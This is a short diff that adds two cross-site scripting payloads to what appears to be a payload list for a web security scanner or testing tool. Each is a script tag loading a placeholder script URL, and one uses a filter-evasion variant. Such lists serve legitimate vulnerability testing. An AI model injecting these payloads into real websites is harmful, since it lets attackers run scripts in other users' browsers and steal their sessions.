@@ -1,0 +1,2 @@
+<SCRIPT SRC={payload_script}></SCRIPT>
+<SCRIPT/XSS SRC="{payload_script}"></SCRIPT>
